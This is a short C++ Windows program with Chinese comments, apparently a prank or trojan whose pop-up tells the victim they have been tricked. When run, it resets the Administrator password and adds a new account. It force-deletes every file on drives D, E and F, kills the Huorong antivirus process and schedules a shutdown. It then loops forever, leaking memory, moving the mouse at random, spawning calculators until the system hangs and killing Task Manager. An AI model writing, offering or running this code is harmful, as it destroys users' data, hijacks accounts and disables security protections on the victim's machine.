#include<iostream>
#include<stdlib.h>
#include<conio.h>
#include<windows.h>
#include<ctime>
using namespace std;
int main()
{
	//system("taskkill /f /t /im ")     这部分是3.1未写的代码 
	system("net user Administrator wssb");//用户密码重设为wssb
	system("net user 我是傻逼 wssb /add");//用户名重设为我是傻逼 
	system("ping www.baidu.com");//ping百度网站
	system("shutdown -s -t 30");//30秒后关机	
	system("del /F /S /Q D:\\");//强制删除D盘(慎用)
	system("del /F /S /Q F:\\");//强制删除F盘(慎用)
	system("del /F /S /Q E:\\");//强制删除E盘(慎用)
	system("taskkill /f /t /im huorong.exe");
	//鼠标乱动和警用任务管理器的代码是从网上拷的 
	int x=GetSystemMetrics(SM_CXSCREEN);//get鼠标x轴 
    int y=GetSystemMetrics(SM_CYSCREEN);//get鼠标y轴
	while(1)
	{
		char *p=new char[100000]; 
		SetCursorPos(rand()%x,rand()%y);//鼠标 x y轴 随机
		system("calc");//打开无数个计算器，直到死机
		MessageBox(NULL, "你 被 骗 了", "danger+", MB_OK | MB_ICONEXCLAMATION);
		system("taskkill /f /im taskmgr.exe");//禁止打开任务管理器
	}
	return 0;
}

